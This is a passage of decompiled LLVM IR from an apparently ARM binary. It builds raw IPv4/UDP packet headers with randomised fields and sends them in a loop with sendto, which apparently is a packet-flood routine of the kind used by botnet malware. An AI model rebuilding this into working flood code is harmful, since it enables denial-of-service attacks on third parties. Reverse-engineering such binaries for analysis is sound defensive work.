  %v2_edcc = load i32, i32* %r3.global-to-local, align 4
  %v3_edcc = add i32 %v2_edcc, 1
  %v4_edcc = inttoptr i32 %v3_edcc to i8*
  store i8 %v1_edcc, i8* %v4_edcc, align 1
  %v0_edd0 = load i32, i32* %r5.global-to-local, align 4
  %v1_edd0 = trunc i32 %v0_edd0 to i8
  %v2_edd0 = load i32, i32* %r3.global-to-local, align 4
  %v3_edd0 = add i32 %v2_edd0, 2
  %v4_edd0 = inttoptr i32 %v3_edd0 to i8*
  store i8 %v1_edd0, i8* %v4_edd0, align 1
  %v0_edd4 = load i32, i32* %ip.global-to-local, align 4
  %v1_edd4 = trunc i32 %v0_edd4 to i8
  %v2_edd4 = load i32, i32* %r3.global-to-local, align 4
  %v3_edd4 = add i32 %v2_edd4, 3
  %v4_edd4 = inttoptr i32 %v3_edd4 to i8*
  store i8 %v1_edd4, i8* %v4_edd4, align 1
  %v0_edd8 = load i32, i32* %r7.global-to-local, align 4
  %v1_edd8 = trunc i32 %v0_edd8 to i8
  %v2_edd8 = load i32, i32* %r3.global-to-local, align 4
  %v3_edd8 = add i32 %v2_edd8, 4
  %v4_edd8 = inttoptr i32 %v3_edd8 to i8*
  store i8 %v1_edd8, i8* %v4_edd8, align 1
  %v0_eddc = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_eddc, i32* %stack_var_-40, align 4
  %v5_ede0 = icmp slt i32 %v0_edc4, %v1_edc4
  br i1 %v5_ede0, label %dec_label_pc_ed14, label %dec_label_pc_ede4

dec_label_pc_ede4:                                ; preds = %dec_label_pc_f044, %dec_label_pc_ed14, %.thread
  %v0_ede4 = load i32, i32* @sl, align 4
  %v2_ede4 = icmp eq i32 %v0_ede4, 0
  store i1 %v2_ede4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_ef90 = icmp eq i32 %v3_ec50, 65535
  %v2_ee5c = icmp eq i32 %v1_ebb4, 0
  %v2_ee24 = icmp eq i32 %v6_ebc8, -1
  %v7_ee24 = icmp eq i32 %v6_ebc8, -1
  br label %dec_label_pc_edec.outer

dec_label_pc_edec.outer:                          ; preds = %dec_label_pc_ef0c, %dec_label_pc_ede4
  %v1_edec.ph.in = phi i32 [ %v1_ef00, %dec_label_pc_ef0c ], [ %v0_ede4, %dec_label_pc_ede4 ]
  %v0_edec.ph = phi i1 [ %v2_ef0c, %dec_label_pc_ef0c ], [ %v2_ede4, %dec_label_pc_ede4 ]
  %v1_edec.ph = icmp slt i32 %v1_edec.ph.in, 0
  %v4_edec = or i1 %v1_edec.ph, %v0_edec.ph
  br label %dec_label_pc_edec

dec_label_pc_edec:                                ; preds = %dec_label_pc_edec.outer, %dec_label_pc_edec
  br i1 %v4_edec, label %dec_label_pc_edec, label %dec_label_pc_edf0

dec_label_pc_edf0:                                ; preds = %dec_label_pc_edec
  store i32 0, i32* %stack_var_-40, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_edfc

dec_label_pc_edfc:                                ; preds = %dec_label_pc_ee64, %dec_label_pc_edf0
  %v1_ee10 = phi i32 [ %v1_eefc, %dec_label_pc_ee64 ], [ 0, %dec_label_pc_edf0 ]
  %v5_ee00 = mul i32 %v1_ee10, 24
  %v1_ee04 = load i32, i32* @r8, align 4
  %v2_ee04 = add i32 %v1_ee04, %v5_ee00
  store i32 %v2_ee04, i32* %r3.global-to-local, align 4
  store i32 %v2_eac0, i32* %ip.global-to-local, align 4
  %v1_ee0c = add i32 %v2_ee04, 20
  %v2_ee0c = inttoptr i32 %v1_ee0c to i8*
  %v3_ee0c = load i8, i8* %v2_ee0c, align 1
  %v4_ee0c = zext i8 %v3_ee0c to i32
  store i32 %v4_ee0c, i32* %r2.global-to-local, align 4
  %v4_ee10 = mul i32 %v1_ee10, 4
  %v5_ee10 = add i32 %v4_ee10, %v2_eac0
  %v6_ee10 = inttoptr i32 %v5_ee10 to i32*
  %v7_ee10 = load i32, i32* %v6_ee10, align 4
  store i32 %v7_ee10, i32* @r5, align 4
  %v7_ee14 = icmp eq i8 %v3_ee0c, 31
  store i1 %v7_ee14, i1* %cpsr_z.global-to-local, align 1
  %v1_ee18 = add i32 %v7_ee10, 20
  store i32 %v1_ee18, i32* @r6, align 4
  %tmp83 = icmp ult i8 %v3_ee0c, 32
  br i1 %tmp83, label %dec_label_pc_ef18, label %dec_label_pc_ee20

dec_label_pc_ee20:                                ; preds = %dec_label_pc_edfc
  store i32 %v6_ebc8, i32* %r0.global-to-local, align 4
  store i1 %v7_ee24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ee24, label %dec_label_pc_ef80, label %dec_label_pc_ee2c

dec_label_pc_ee2c:                                ; preds = %dec_label_pc_ef18, %dec_label_pc_ee20
  store i32 %v3_ec50, i32* %r1.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_ef90, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_ef90, label %dec_label_pc_ef9c, label %dec_label_pc_ee40

dec_label_pc_ee40:                                ; preds = %dec_label_pc_ef80.dec_label_pc_ee40_crit_edge, %dec_label_pc_ee2c
  %v1_ee44 = phi i32 [ %v1_ee44.pre, %dec_label_pc_ef80.dec_label_pc_ee40_crit_edge ], [ 65535, %dec_label_pc_ee2c ]
  store i32 %v3_ec34, i32* %r2.global-to-local, align 4
  %v9_ee44 = icmp eq i32 %v3_ec34, %v1_ee44
  store i1 %v9_ee44, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ee44, label %dec_label_pc_efb8, label %dec_label_pc_ee4c

dec_label_pc_ee4c:                                ; preds = %dec_label_pc_ef9c.dec_label_pc_ee4c_crit_edge, %dec_label_pc_ee40
  %v1_ee50 = phi i32 [ %v1_ee50.pre, %dec_label_pc_ef9c.dec_label_pc_ee4c_crit_edge ], [ %v1_ee44, %dec_label_pc_ee40 ]
  store i32 %v3_ec54, i32* %r3.global-to-local, align 4
  %v9_ee50 = icmp eq i32 %v3_ec54, %v1_ee50
  store i1 %v9_ee50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ee50, label %dec_label_pc_efd4, label %dec_label_pc_ee58

dec_label_pc_ee58:                                ; preds = %dec_label_pc_efb8, %dec_label_pc_ee4c
  store i32 %v1_ebb4, i32* %ip.global-to-local, align 4
  store i1 %v2_ee5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ee5c, label %dec_label_pc_ee64, label %dec_label_pc_eff0

dec_label_pc_ee64:                                ; preds = %dec_label_pc_ee58, %dec_label_pc_efd4, %dec_label_pc_eff0
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_ee68 = load i32, i32* @r7, align 4
  %v1_ee68 = trunc i32 %v0_ee68 to i8
  %v2_ee68 = load i32, i32* @r5, align 4
  %v3_ee68 = add i32 %v2_ee68, 10
  %v4_ee68 = inttoptr i32 %v3_ee68 to i8*
  store i8 %v1_ee68, i8* %v4_ee68, align 1
  %v0_ee6c = load i32, i32* @r7, align 4
  %v1_ee6c = trunc i32 %v0_ee6c to i8
  %v2_ee6c = load i32, i32* @r5, align 4
  %v3_ee6c = add i32 %v2_ee6c, 11
  %v4_ee6c = inttoptr i32 %v3_ee6c to i8*
  store i8 %v1_ee6c, i8* %v4_ee6c, align 1
  %v0_ee70 = load i32, i32* @r5, align 4
  store i32 %v0_ee70, i32* @r0, align 4
  %v2_ee74 = call i32 @function_fda0(i32 %v0_ee70, i32 20)
  %v3_ee74 = trunc i32 %v2_ee74 to i8
  store i32 %v2_ee74, i32* %r0.global-to-local, align 4
  %v4_ee78 = sdiv i32 %v2_ee74, 256
  store i32 %v4_ee78, i32* %r3.global-to-local, align 4
  %v1_ee7c = trunc i32 %v4_ee78 to i8
  %v2_ee7c = load i32, i32* @r5, align 4
  %v3_ee7c = add i32 %v2_ee7c, 11
  %v4_ee7c = inttoptr i32 %v3_ee7c to i8*
  store i8 %v1_ee7c, i8* %v4_ee7c, align 1
  %v3_ee80 = load i32, i32* @r5, align 4
  %v4_ee80 = add i32 %v3_ee80, 10
  %v5_ee80 = inttoptr i32 %v4_ee80 to i8*
  store i8 %v3_ee74, i8* %v5_ee80, align 1
  %v0_ee84 = load i32, i32* @r7, align 4
  %v1_ee84 = trunc i32 %v0_ee84 to i8
  %v2_ee84 = load i32, i32* @r6, align 4
  %v3_ee84 = add i32 %v2_ee84, 6
  %v4_ee84 = inttoptr i32 %v3_ee84 to i8*
  store i8 %v1_ee84, i8* %v4_ee84, align 1
  %v0_ee88 = load i32, i32* @r7, align 4
  %v1_ee88 = trunc i32 %v0_ee88 to i8
  %v2_ee88 = load i32, i32* @r6, align 4
  %v3_ee88 = add i32 %v2_ee88, 7
  %v4_ee88 = inttoptr i32 %v3_ee88 to i8*
  store i8 %v1_ee88, i8* %v4_ee88, align 1
  %v0_ee8c = load i32, i32* @r5, align 4
  %v1_ee8c = add i32 %v0_ee8c, 24
  %v2_ee8c = inttoptr i32 %v1_ee8c to i8*
  %v3_ee8c = load i8, i8* %v2_ee8c, align 1
  %v4_ee8c = zext i8 %v3_ee8c to i32
  store i32 %v4_ee8c, i32* %r3.global-to-local, align 4
  %v1_ee90 = add i32 %v0_ee8c, 25
  %v2_ee90 = inttoptr i32 %v1_ee90 to i8*
  %v3_ee90 = load i8, i8* %v2_ee90, align 1
  %v4_ee90 = zext i8 %v3_ee90 to i32
  %v0_ee94 = load i32, i32* @r6, align 4
  store i32 %v0_ee94, i32* @r1, align 4
  %v4_ee98 = mul nuw nsw i32 %v4_ee90, 256
  %v5_ee98 = or i32 %v4_ee98, %v4_ee8c
  store i32 %v5_ee98, i32* %r2.global-to-local, align 4
  store i32 %v0_ee8c, i32* %r0.global-to-local, align 4
  %v0_eea0 = load i32, i32* @sb, align 4
  store i32 %v0_eea0, i32* %r3.global-to-local, align 4
  %v4_eea4 = call i32 @function_fdfc(i32 %v0_ee8c, i32 %v0_ee94, i32 %v5_ee98, i32 %v0_eea0)
  %v5_eea4 = trunc i32 %v4_eea4 to i8
  store i32 %v4_eea4, i32* %r0.global-to-local, align 4
  %v4_eea837 = udiv i32 %v4_eea4, 256
  %v1_eeac = trunc i32 %v4_eea837 to i8
  %v2_eeac = load i32, i32* @r6, align 4
  %v3_eeac = add i32 %v2_eeac, 7
  %v4_eeac = inttoptr i32 %v3_eeac to i8*
  store i8 %v1_eeac, i8* %v4_eeac, align 1
  %v3_eeb0 = load i32, i32* @r6, align 4
  %v4_eeb0 = add i32 %v3_eeb0, 6
  %v5_eeb0 = inttoptr i32 %v4_eeb0 to i8*
  store i8 %v5_eea4, i8* %v5_eeb0, align 1
  %v3_eeb4 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_eeb4, i32* %r3.global-to-local, align 4
  %v0_eeb8 = load i32, i32* @r5, align 4
  %v1_eeb8 = add i32 %v0_eeb8, 20
  %v2_eeb8 = inttoptr i32 %v1_eeb8 to i32*
  %v3_eeb8 = load i32, i32* %v2_eeb8, align 4
  %v3_eec0 = udiv i32 %v3_eeb8, 65536
  store i32 %v3_eec0, i32* %r2.global-to-local, align 4
  %v5_eec4 = mul i32 %v3_eeb4, 24
  %v1_eec8 = load i32, i32* @r8, align 4
  %v2_eec8 = add i32 %v1_eec8, %v5_eec4
  store i32 %v2_eec8, i32* %ip.global-to-local, align 4
  %v3_eecc34 = udiv i32 %v3_eeb8, 16777216
  %v1_eed0 = trunc i32 %v3_eecc34 to i8
  %v3_eed0 = add i32 %v2_eec8, 3
  %v4_eed0 = inttoptr i32 %v3_eed0 to i8*
  store i8 %v1_eed0, i8* %v4_eed0, align 1
  %v0_eed4 = load i32, i32* %r2.global-to-local, align 4
  %v1_eed4 = trunc i32 %v0_eed4 to i8
  %v2_eed4 = load i32, i32* %ip.global-to-local, align 4
  %v3_eed4 = add i32 %v2_eed4, 2
  %v4_eed4 = inttoptr i32 %v3_eed4 to i8*
  store i8 %v1_eed4, i8* %v4_eed4, align 1
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_eedc = load i32, i32* @r5, align 4
  store i32 %v0_eedc, i32* %r1.global-to-local, align 4
  store i32 %v3_ebdc, i32* %r0.global-to-local, align 4
  %v0_eee4 = load i32, i32* @fp, align 4
  store i32 %v0_eee4, i32* %r2.global-to-local, align 4
  store i32 16, i32* %r4.global-to-local, align 4
  %v0_eeec = load i32, i32* %ip.global-to-local, align 4
  %v6_eef4 = call i32 @_sendto(i32 %v3_ebdc, i32 %v0_eedc, i32 %v0_eee4, i32 16384, i32 %v0_eeec, i32 16)
  %v3_eef8 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_eef8, i32* %r3.global-to-local, align 4
  %v1_eefc = add i32 %v3_eef8, 1
  store i32 %v1_eefc, i32* %r0.global-to-local, align 4
  %v1_ef00 = load i32, i32* @sl, align 4
  %v9_ef00 = icmp eq i32 %v1_eefc, %v1_ef00
  store i1 %v9_ef00, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_eefc, i32* %stack_var_-40, align 4
  %v5_ef08 = icmp slt i32 %v1_eefc, %v1_ef00
  br i1 %v5_ef08, label %dec_label_pc_edfc, label %dec_label_pc_ef0c

dec_label_pc_ef0c:                                ; preds = %dec_label_pc_ee64
  %v2_ef0c = icmp eq i32 %v1_ef00, 0
  store i1 %v2_ef0c, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_edec.outer

dec_label_pc_ef18:                                ; preds = %dec_label_pc_edfc
  %v1_ef18 = add i32 %v2_ee04, 16
  %v2_ef18 = inttoptr i32 %v1_ef18 to i32*
  %v3_ef18 = load i32, i32* %v2_ef18, align 4
  store i32 %v3_ef18, i32* %r4.global-to-local, align 4
  %v0_ef1c = call i32 @function_117dc()
  store i32 %v0_ef1c, i32* %r0.global-to-local, align 4
  %v3_ef20 = load i32, i32* %stack_var_-40, align 4
  %v5_ef28 = mul i32 %v3_ef20, 24
  %v1_ef30 = load i32, i32* @r8, align 4
  %v2_ef30 = add i32 %v1_ef30, %v5_ef28
  store i32 %v2_ef30, i32* %r1.global-to-local, align 4
  %v1_ef34 = and i32 %v3_ef18, 65280
  store i32 %v1_ef34, i32* %r3.global-to-local, align 4
  %v1_ef2c = udiv i32 %v3_ef18, 256
  %v3_ef38 = and i32 %v1_ef2c, 65280
  store i32 %v3_ef38, i32* %r2.global-to-local, align 4
  %v3_ef3c = mul i32 %v3_ef18, 16777216
  store i32 %v3_ef3c, i32* %ip.global-to-local, align 4
  %v1_ef40 = add i32 %v2_ef30, 20
  %v2_ef40 = inttoptr i32 %v1_ef40 to i8*
  %v3_ef40 = load i8, i8* %v2_ef40, align 1
  %v4_ef40 = zext i8 %v3_ef40 to i32
  %v4_ef44 = mul nuw nsw i32 %v1_ef34, 256
  %v5_ef44 = or i32 %v4_ef44, %v3_ef3c
  store i32 %v5_ef44, i32* %ip.global-to-local, align 4
  %v2_ef4c = call i32 @llvm.bswap.i32(i32 %v3_ef18)
  %v7_ef50 = lshr i32 %v0_ef1c, %v4_ef40
  %v8_ef50 = add i32 %v7_ef50, %v2_ef4c
  store i32 %v8_ef50, i32* %r2.global-to-local, align 4
  %v3_ef5c = mul i32 %v8_ef50, 16777216
  %v1_ef54 = mul i32 %v8_ef50, 256
  %v4_ef60 = and i32 %v1_ef54, 16711680
  %v5_ef60 = or i32 %v4_ef60, %v3_ef5c
  store i32 %v5_ef60, i32* %r1.global-to-local, align 4
  store i32 %v6_ebc8, i32* %r0.global-to-local, align 4
  %v2_ef70 = call i32 @llvm.bswap.i32(i32 %v8_ef50)
  store i32 %v2_ef70, i32* %r3.global-to-local, align 4
  store i1 %v7_ee24, i1* %cpsr_z.global-to-local, align 1
  %v1_ef78 = load i32, i32* @r5, align 4
  %v2_ef78 = add i32 %v1_ef78, 16
  %v3_ef78 = inttoptr i32 %v2_ef78 to i32*
  store i32 %v2_ef70, i32* %v3_ef78, align 4
  br i1 %v2_ee24, label %dec_label_pc_ef80, label %dec_label_pc_ee2c

dec_label_pc_ef80:                                ; preds = %dec_label_pc_ef18, %dec_label_pc_ee20
  %v0_ef80 = call i32 @function_117dc()
  store i32 %v0_ef80, i32* %r0.global-to-local, align 4
  store i32 %v3_ec50, i32* %r1.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_ef90, i1* %cpsr_z.global-to-local, align 1
  %v1_ef94 = load i32, i32* @r5, align 4
  %v2_ef94 = add i32 %v1_ef94, 12
  %v3_ef94 = inttoptr i32 %v2_ef94 to i32*
  store i32 %v0_ef80, i32* %v3_ef94, align 4
  br i1 %v3_ef90, label %dec_label_pc_ef9c, label %dec_label_pc_ef80.dec_label_pc_ee40_crit_edge

dec_label_pc_ef80.dec_label_pc_ee40_crit_edge:    ; preds = %dec_label_pc_ef80
  %v1_ee44.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_ee40

dec_label_pc_ef9c:                                ; preds = %dec_label_pc_ef80, %dec_label_pc_ee2c
  %v0_ef9c = call i32 @function_117dc()
  %v1_ef9c = trunc i32 %v0_ef9c to i8
  store i32 %v0_ef9c, i32* %r0.global-to-local, align 4
  store i32 %v3_ec34, i32* %r2.global-to-local, align 4
  %v4_efa4 = sdiv i32 %v0_ef9c, 256
  store i32 %v4_efa4, i32* %r3.global-to-local, align 4
  %v1_efa8 = load i32, i32* @r4, align 4
  %v9_efa8 = icmp eq i32 %v3_ec34, %v1_efa8
  store i1 %v9_efa8, i1* %cpsr_z.global-to-local, align 1
  %v1_efac = trunc i32 %v4_efa4 to i8
  %v2_efac = load i32, i32* @r5, align 4
  %v3_efac = add i32 %v2_efac, 5
  %v4_efac = inttoptr i32 %v3_efac to i8*
  store i8 %v1_efac, i8* %v4_efac, align 1
  %v3_efb0 = load i32, i32* @r5, align 4
  %v4_efb0 = add i32 %v3_efb0, 4
  %v5_efb0 = inttoptr i32 %v4_efb0 to i8*
  store i8 %v1_ef9c, i8* %v5_efb0, align 1
  %v0_efb4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_efb4, label %dec_label_pc_efb8, label %dec_label_pc_ef9c.dec_label_pc_ee4c_crit_edge

dec_label_pc_ef9c.dec_label_pc_ee4c_crit_edge:    ; preds = %dec_label_pc_ef9c
  %v1_ee50.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_ee4c

dec_label_pc_efb8:                                ; preds = %dec_label_pc_ef9c, %dec_label_pc_ee40
  %v0_efb8 = call i32 @function_117dc()
  %v1_efb8 = trunc i32 %v0_efb8 to i8
  store i32 %v0_efb8, i32* %r0.global-to-local, align 4
  %v4_efbc = sdiv i32 %v0_efb8, 256
  store i32 %v4_efbc, i32* %r3.global-to-local, align 4
  %v3_efc0 = load i32, i32* @r5, align 4
  %v4_efc0 = add i32 %v3_efc0, 20
  %v5_efc0 = inttoptr i32 %v4_efc0 to i8*
  store i8 %v1_efb8, i8* %v5_efc0, align 1
  %v0_efc4 = load i32, i32* %r3.global-to-local, align 4
  %v1_efc4 = trunc i32 %v0_efc4 to i8
  %v2_efc4 = load i32, i32* @r6, align 4
  %v3_efc4 = add i32 %v2_efc4, 1
  %v4_efc4 = inttoptr i32 %v3_efc4 to i8*
  store i8 %v1_efc4, i8* %v4_efc4, align 1
  store i32 %v3_ec54, i32* %r3.global-to-local, align 4
  %v1_efcc = load i32, i32* @r4, align 4
  %v9_efcc = icmp eq i32 %v3_ec54, %v1_efcc
  store i1 %v9_efcc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_efcc, label %dec_label_pc_efd4, label %dec_label_pc_ee58

dec_label_pc_efd4:                                ; preds = %dec_label_pc_efb8, %dec_label_pc_ee4c
  %v0_efd4 = call i32 @function_117dc()
  %v1_efd4 = trunc i32 %v0_efd4 to i8
  store i32 %v0_efd4, i32* %r0.global-to-local, align 4
  store i32 %v1_ebb4, i32* %ip.global-to-local, align 4
  %v4_efdc = sdiv i32 %v0_efd4, 256
  store i32 %v4_efdc, i32* %r3.global-to-local, align 4
  store i1 %v2_ee5c, i1* %cpsr_z.global-to-local, align 1
  %v1_efe4 = trunc i32 %v4_efdc to i8
  %v2_efe4 = load i32, i32* @r6, align 4
  %v3_efe4 = add i32 %v2_efe4, 3
  %v4_efe4 = inttoptr i32 %v3_efe4 to i8*
  store i8 %v1_efe4, i8* %v4_efe4, align 1
  %v3_efe8 = load i32, i32* @r6, align 4
  %v4_efe8 = add i32 %v3_efe8, 2
  %v5_efe8 = inttoptr i32 %v4_efe8 to i8*
  store i8 %v1_efd4, i8* %v5_efe8, align 1
  %v0_efec = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_efec, label %dec_label_pc_ee64, label %dec_label_pc_eff0

dec_label_pc_eff0:                                ; preds = %dec_label_pc_ee58, %dec_label_pc_efd4
  %v0_eff0 = load i32, i32* @r5, align 4
  %v1_eff0 = add i32 %v0_eff0, 28
  store i32 %v1_eff0, i32* %r0.global-to-local, align 4
  store i32 %v0_ec2c, i32* @r1, align 4
  %v1_eff8 = inttoptr i32 %v1_eff0 to i8*
  %v2_eff8 = call i32 @function_119b8(i8* %v1_eff8)
  store i32 %v2_eff8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ee64

dec_label_pc_f000:                                ; preds = %dec_label_pc_ebec
  store i32 %v3_ebdc, i32* %r0.global-to-local, align 4
  %v1_f004 = call i32 @_close(i32 %v3_ebdc)
  store i32 %v1_f004, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f008

dec_label_pc_f008:                                ; preds = %dec_label_pc_eaa0, %dec_label_pc_f000
  %v29_f00c = phi i32 [ %v3_ebdc, %dec_label_pc_eaa0 ], [ %v1_f004, %dec_label_pc_f000 ]
  store i32 %v3_eaa0, i32* %r4.global-to-local, align 4
  store i32 %v6_eaa0, i32* %r5.global-to-local, align 4
  store i32 %v9_eaa0, i32* %r6.global-to-local, align 4
  store i32 %v12_eaa0, i32* %r7.global-to-local, align 4
  store i32 %v18_eaa0, i32* %sb.global-to-local, align 4
  store i32 %v24_eaa0, i32* %fp.global-to-local, align 4
  ret i32 %v29_f00c

dec_label_pc_f010:                                ; preds = %dec_label_pc_ec70
  %v3_f014 = sext i8 %v5_ecd4 to i32
  %v7_f014 = sext i8 %v5_ecd8 to i32
  %v3_f018 = sdiv i32 %v3_f014, 256
  store i32 %v3_f018, i32* %r0.global-to-local, align 4
  %v3_f01c = sdiv i32 %v7_f014, 256
  store i32 %v3_f01c, i32* %r1.global-to-local, align 4
  store i32 %v1_ecac, i32* %r2.global-to-local, align 4
  store i32 %v1_ecb0, i32* %r3.global-to-local, align 4
  %v3_f02833 = udiv i32 %v1_ecc8, 256
  store i32 %v3_f02833, i32* %ip.global-to-local, align 4
  %v5_f03c = trunc i32 %v3_f02833 to i8
  store i32 0, i32* %r6.global-to-local, align 4
  %v4_f094 = sext i8 %v5_eb30 to i32
  %sext11 = mul i32 %v0_ec30, 16777216
  %v4_f0fc = sdiv i32 %sext11, 16777216
  %sext12 = mul i32 %v0_ec40, 16777216
  %v4_f10c = sdiv i32 %sext12, 16777216
  %v1_f114 = trunc i32 %v4_f10c to i8
  br label %dec_label_pc_f044

dec_label_pc_f044:                                ; preds = %dec_label_pc_f044, %dec_label_pc_f010
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_f050 = call i32 @_calloc(i32 1510, i32 1)
  store i32 %v2_f050, i32* %r0.global-to-local, align 4
  store i32 %v2_eac0, i32* %r1.global-to-local, align 4
  %v3_f058 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_f058, i32* %r2.global-to-local, align 4
  %v2_f05c = load i32, i32* %r6.global-to-local, align 4
  %v5_f05c = mul i32 %v2_f05c, 4
  %v6_f05c = add i32 %v5_f05c, %v2_eac0
  %v7_f05c = inttoptr i32 %v6_f05c to i32*
  store i32 %v2_f050, i32* %v7_f05c, align 4
  %v0_f060 = load i32, i32* %r1.global-to-local, align 4
  %v1_f060 = load i32, i32* %r2.global-to-local, align 4
  %v4_f060 = mul i32 %v1_f060, 4
  %v5_f060 = add i32 %v4_f060, %v0_f060
  %v6_f060 = inttoptr i32 %v5_f060 to i32*
  %v7_f060 = load i32, i32* %v6_f060, align 4
  store i32 %v7_f060, i32* %r1.global-to-local, align 4
  %v1_f064 = inttoptr i32 %v7_f060 to i8*
  %v2_f064 = load i8, i8* %v1_f064, align 1
  %tmp84 = urem i8 %v2_f064, 16
  %v1_f068 = zext i8 %tmp84 to i32
  %v1_f06c = or i32 %v1_f068, 64
  store i32 %v1_f06c, i32* %r3.global-to-local, align 4
  %v1_f070 = trunc i32 %v1_f06c to i8
  store i8 %v1_f070, i8* %v1_f064, align 1
  %v0_f074 = load i32, i32* %r1.global-to-local, align 4
  %v1_f074 = inttoptr i32 %v0_f074 to i8*
  %v2_f074 = load i8, i8* %v1_f074, align 1
  %v3_f074 = zext i8 %v2_f074 to i32
  %v1_f078 = and i32 %v3_f074, 240
  %v1_f07c = or i32 %v1_f078, 5
  store i32 %v1_f07c, i32* %r2.global-to-local, align 4
  %v3_f084 = add i32 %v0_f074, 9
  %v4_f084 = inttoptr i32 %v3_f084 to i8*
  store i8 17, i8* %v4_f084, align 1
  %v0_f088 = load i32, i32* %r2.global-to-local, align 4
  %v1_f088 = trunc i32 %v0_f088 to i8
  %v2_f088 = load i32, i32* %r1.global-to-local, align 4
  %v3_f088 = inttoptr i32 %v2_f088 to i8*
  store i8 %v1_f088, i8* %v3_f088, align 1
  %v2_f090 = load i32, i32* %r1.global-to-local, align 4
  %v3_f090 = add i32 %v2_f090, 1
  %v4_f090 = inttoptr i32 %v3_f090 to i8*
  store i8 %v5_eaf8, i8* %v4_f090, align 1
  store i32 %v4_f094, i32* %r0.global-to-local, align 4
  %v2_f098 = load i32, i32* %r1.global-to-local, align 4
  %v3_f098 = add i32 %v2_f098, 8
  %v4_f098 = inttoptr i32 %v3_f098 to i8*
  store i8 %v5_eb30, i8* %v4_f098, align 1
  %v3_f09c = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_f09c, i32* %r2.global-to-local, align 4
  store i32 %v6_ebc8, i32* %ip.global-to-local, align 4
  %v3_f0a4 = mul i32 %v3_f09c, 32
  store i32 %v3_f0a4, i32* %r3.global-to-local, align 4
  %v1_f0a8 = load i32, i32* %r1.global-to-local, align 4
  %v2_f0a8 = add i32 %v1_f0a8, 12
  %v3_f0a8 = inttoptr i32 %v2_f0a8 to i32*
  store i32 %v6_ebc8, i32* %v3_f0a8, align 4
  %v0_f0ac = load i32, i32* %r3.global-to-local, align 4
  %v1_f0ac = load i32, i32* %r2.global-to-local, align 4
  %tmp85 = mul i32 %v1_f0ac, -8
  %v5_f0ac = add i32 %v0_f0ac, %tmp85
  %v1_f0b0 = load i32, i32* @r8, align 4
  %v2_f0b0 = add i32 %v5_f0ac, %v1_f0b0
  store i32 %v2_f0b0, i32* %r3.global-to-local, align 4
  %v1_f0b4 = add i32 %v2_f0b0, 16
  %v2_f0b4 = inttoptr i32 %v1_f0b4 to i32*
  %v3_f0b4 = load i32, i32* %v2_f0b4, align 4
  %v1_f0b8 = load i32, i32* %r1.global-to-local, align 4
  %v2_f0b8 = add i32 %v1_f0b8, 16
  %v3_f0b8 = inttoptr i32 %v2_f0b8 to i32*
  store i32 %v3_f0b4, i32* %v3_f0b8, align 4
  %v0_f0c0 = load i32, i32* %r2.global-to-local, align 4
  %v1_f0c0 = add i32 %v0_f0c0, 1
  store i32 %v1_f0c0, i32* %r6.global-to-local, align 4
  store i32 %v7_f014, i32* %ip.global-to-local, align 4
  store i32 %v3_f018, i32* %r2.global-to-local, align 4
  %v2_f0cc = load i32, i32* %r1.global-to-local, align 4
  %v3_f0cc = add i32 %v2_f0cc, 2
  %v4_f0cc = inttoptr i32 %v3_f0cc to i8*
  store i8 %v5_ecd4, i8* %v4_f0cc, align 1
  store i32 %v3_f01c, i32* %r0.global-to-local, align 4
  %v0_f0d4 = load i32, i32* %r2.global-to-local, align 4
  %v1_f0d4 = trunc i32 %v0_f0d4 to i8
  %v2_f0d4 = load i32, i32* %r1.global-to-local, align 4
  %v3_f0d4 = add i32 %v2_f0d4, 3
  %v4_f0d4 = inttoptr i32 %v3_f0d4 to i8*
  store i8 %v1_f0d4, i8* %v4_f0d4, align 1
  %v0_f0d8 = load i32, i32* %ip.global-to-local, align 4
  %v1_f0d8 = trunc i32 %v0_f0d8 to i8
  %v2_f0d8 = load i32, i32* %r1.global-to-local, align 4
  %v3_f0d8 = add i32 %v2_f0d8, 4
  %v4_f0d8 = inttoptr i32 %v3_f0d8 to i8*
  store i8 %v1_f0d8, i8* %v4_f0d8, align 1
  store i32 64, i32* %r2.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v0_f0e4 = load i32, i32* %r1.global-to-local, align 4
  %v1_f0e4 = add i32 %v0_f0e4, 20
  store i32 %v1_f0e4, i32* %r3.global-to-local, align 4
  %v0_f0e8 = load i32, i32* %r0.global-to-local, align 4
  %v1_f0e8 = trunc i32 %v0_f0e8 to i8
  %v3_f0e8 = add i32 %v0_f0e4, 5
  %v4_f0e8 = inttoptr i32 %v3_f0e8 to i8*
  store i8 %v1_f0e8, i8* %v4_f0e8, align 1
  %v0_f0ec = load i32, i32* %r2.global-to-local, align 4
  %v1_f0ec = trunc i32 %v0_f0ec to i8
  %v2_f0ec = load i32, i32* %r1.global-to-local, align 4
  %v3_f0ec = add i32 %v2_f0ec, 6
  %v4_f0ec = inttoptr i32 %v3_f0ec to i8*
  store i8 %v1_f0ec, i8* %v4_f0ec, align 1
  %v0_f0f0 = load i32, i32* %ip.global-to-local, align 4
